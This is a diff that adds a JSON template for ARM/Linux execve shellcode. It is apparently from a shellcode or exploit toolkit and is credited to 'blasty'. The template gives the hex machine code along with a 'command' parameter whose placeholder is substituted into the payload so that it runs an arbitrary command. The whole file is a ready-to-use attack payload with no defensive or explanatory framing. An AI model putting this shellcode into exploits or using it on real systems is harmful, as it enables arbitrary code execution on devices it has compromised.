@@ -1,0 +1,12 @@
+{
+	"description" : "ARM/Linux execve shellcode, arbitrary command",
+	"author"      : "blasty",
+	"parameters"  : [
+		{
+			"name"        : "command",
+			"type"        : "string",
+			"placeholder" : "c0de"
+		}
+	],
+	"code" : "10008fe20020a0e305002de90d10a0e10b70a0e3000000efc0de00"
+}
